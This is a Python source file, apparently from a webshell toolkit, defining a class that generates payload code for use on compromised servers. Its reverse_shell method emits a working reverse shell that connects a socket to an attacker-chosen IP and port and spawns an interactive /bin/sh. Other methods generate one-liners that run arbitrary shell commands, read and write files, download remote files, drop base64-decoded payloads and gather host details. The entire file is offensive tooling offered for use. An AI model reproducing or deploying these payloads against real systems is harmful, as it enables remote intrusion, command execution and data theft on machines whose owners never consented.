"""Python code generator for webshell operations."""


class PythonGenerator:
    """Generate Python code for webshell operations."""

    @staticmethod
    def reverse_shell(target_ip: str, target_port: int) -> str:
        """Generate Python reverse shell code."""
        return f"""import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{target_ip}",{target_port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])"""

    @staticmethod
    def read_file(file_path: str, encoding: str = "utf-8") -> str:
        """Generate Python code to read file."""
        return f"open('{file_path}', 'r', encoding='{encoding}').read()"

    @staticmethod
    def write_file(file_path: str, content: str, encoding: str = "utf-8") -> str:
        """Generate Python code to write file."""
        return f"open('{file_path}', 'w', encoding='{encoding}').write('''{content}''')"

    @staticmethod
    def run_command(command: str, capture_output: bool = True) -> str:
        """Generate Python code to execute command."""
        if capture_output:
            return f"__import__('subprocess').check_output('{command}', shell=True).decode()"
        else:
            return f"__import__('os').system('{command}')"

    @staticmethod
    def list_directory(directory: str = ".") -> str:
        """Generate Python code to list directory."""
        return f"'\\n'.join(__import__('os').listdir('{directory}'))"

    @staticmethod
    def download_file(url: str, save_path: str) -> str:
        """Generate Python code to download file."""
        return f"__import__('urllib.request').urlretrieve('{url}', '{save_path}')"

    @staticmethod
    def upload_file(file_path: str, content: str) -> str:
        """Generate Python code to upload file (base64 content)."""
        return f"""import base64
with open('{file_path}', 'wb') as f:
    f.write(base64.b64decode('{content}'))"""

    @staticmethod
    def get_system_info() -> str:
        """Generate Python code to get system info."""
        return """import platform, os
info = {
    'os': platform.system(),
    'arch': platform.machine(),
    'hostname': platform.node(),
    'user': os.getenv('USER') or os.getenv('USERNAME'),
    'cwd': os.getcwd()
}
str(info)"""
